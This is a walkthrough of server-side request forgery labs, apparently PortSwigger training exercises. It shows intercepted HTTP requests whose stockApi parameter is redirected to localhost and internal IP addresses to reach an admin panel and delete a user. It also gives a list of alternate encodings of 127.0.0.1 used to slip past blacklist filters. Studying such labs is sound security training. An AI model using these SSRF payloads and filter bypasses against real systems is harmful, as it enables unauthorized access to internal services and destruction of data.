##### ***What is SSRF?***
SSRF is a web security vulnerability that allows an attacker to make requests to internal systems in the organizations infrastructure through the public web facing application. This could lead to the attacker gaining access to sensitive data and authorization credentials
##### ***Exploiting the local loop back interface when making a request***
A very basic SSRF attack might involve modifying a request to point to the web server's loop back interface, this could be `127.0.0.1` or `localhost`. This could reveal sensitive information that only admins or authorized users might be able to access. In this example, there is a stock check functionality that makes a request to an external back end system. Using the burp interceptor, I was able to change the request to the `localhost/admin` URL and get access to an admin dashboard to delete user's and manage the admin panel.
```
POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

I intercepted the request and changed it to `http://localhost/admin` and I was able to access admin functionality and an admin dashboard.
```
POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118

stockApi=http://localhost/admin
```

Although I could not delete users directly from the admin interface that was displayed after making the request because the request was still unauthorized. There was an endpoint `/admin/delete?username=carlos`, so I modified the original request to include this endpoint.
```
POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118

stockApi=http://localhost/admin/delete?username=carlos
```

This worked and I was able to successfully delete the user "carlos."
##### ***Using SSRF to gain access to other back end systems***
This website was making a request to an external API on an internal private IP address `192.168.1.1:8080`. I was able to use the burp intruder to find another internal private IP address at `192.168.1.220` and successfully execute the admin functionality of deleting a user. 
```
POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118

stockApi=http://192.168.1.<X>:8080
```

I then found the endpoint for deleting users and made this request to delete the `carlos` user.
```
POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118

stockApi=http://192.168.1.220:8080/delete?username=carlos
```
##### ***Bypassing filters for blacklisted inputs***
Most of the time, WAFs will be blocking input containing specific keywords like `localhost`, `127.0.0.1`, `/admin`, etc... In order to bypass these, you can use different methods of encoding and obfuscating keywords to get around any filters.

These different encoding and obfuscation techniques may work for `127.0.0.1`:
- Decimal `2130706433`
- Octal `017700000001`
- Omitting every 0 `127.1`
- Hexadecimal  `0x7F000001`
- Zero-Padded Decimal `127.000.000.001`
- Mixed Octal and Decimal: You can mix octal and decimal representations in the same IP address. For example, `127.0.0.01` mixes decimal for the first, second, and third octets and octal for the fourth.
- Binary `01111111.00000000.00000000.00000001`
- URL Encoding `%7F%00%00%01`

I was able to bypass the filter and successfully delete the user by using this payload.
```
POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118

stockApi=http://127.1/Admin/delete?username=carlos
```
